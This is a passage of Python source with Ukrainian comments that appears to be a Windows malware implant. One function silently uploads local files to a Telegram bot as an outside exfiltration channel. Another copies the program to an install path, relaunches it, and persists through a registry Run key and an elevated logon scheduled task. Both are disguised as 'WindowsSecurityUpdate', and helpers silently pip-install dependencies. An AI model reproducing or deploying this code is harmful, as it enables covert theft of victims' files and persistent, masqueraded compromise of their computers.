def send_file(path):
    try:
        with open(path, 'rb') as f:
            boundary = '----boundary' + str(time.time()).replace('.', '')
            body = (f'--{boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n{CHAT_ID}\r\n'
                    f'--{boundary}\r\nContent-Disposition: form-data; name="document"; filename="{os.path.basename(path)}"\r\n'
                    'Content-Type: application/octet-stream\r\n\r\n').encode() + f.read() + f'\r\n--{boundary}--\r\n'.encode()
            req = urllib.request.Request(f"https://api.telegram.org/bot{TOKEN}/sendDocument", data=body, method='POST')
            req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
            urllib.request.urlopen(req, timeout=10)
    except:
        pass

# ---------- ПЕРСИСТЕНЦІЯ (КОПІЮВАННЯ І АВТОЗАПУСК) ----------
def ensure_persistence():
    """Перевіряє, чи програма запущена з потрібної папки, якщо ні – копіює себе і запускає ту копію."""
    if sys.executable.lower() != INSTALL_PATH.lower() and not sys.executable.lower().endswith('python.exe'):
        # Якщо це не інтерпретатор Python і не наш встановлений файл
        try:
            shutil.copy2(sys.executable, INSTALL_PATH)  # копіюємо себе
            subprocess.Popen([INSTALL_PATH], shell=True)  # запускаємо копію
            sys.exit(0)  # закриваємо поточний процес
        except:
            pass
    # Додаємо в автозапуск через реєстр
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, INSTALL_PATH)
        winreg.CloseKey(key)
    except:
        pass
    # Додаємо в плани завдань (запасний варіант)
    try:
        task_name = "WindowsSecurityUpdate"
        xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <Enabled>true</Enabled>
    <AllowStartOnDemand>true</AllowStartOnDemand>
  </Settings>
  <Actions>
    <Exec>
      <Command>{INSTALL_PATH}</Command>
    </Exec>
  </Actions>
</Task>"""
        temp_xml = os.path.join(tempfile.gettempdir(), 'task.xml')
        with open(temp_xml, 'w') as f:
            f.write(xml)
        subprocess.run(f'schtasks /create /tn "{task_name}" /xml "{temp_xml}" /f', shell=True, capture_output=True)
        os.remove(temp_xml)
    except:
        pass

# ---------- ПЕРЕВІРКА НАЯВНОСТІ МОДУЛІВ (АВТОВСТАНОВЛЕННЯ) ----------
def install_module(module_name, pip_name=None):
    if pip_name is None:
        pip_name = module_name
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", pip_name],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except:
        return False

def ensure_module(imp_name, pip_name):
    try:
        __import__(imp_name)
        return True
    except ImportError:
        if install_module(imp_name, pip_name):
            try:
                __import__(imp_name)
                return True
            except:
                return False
        return False

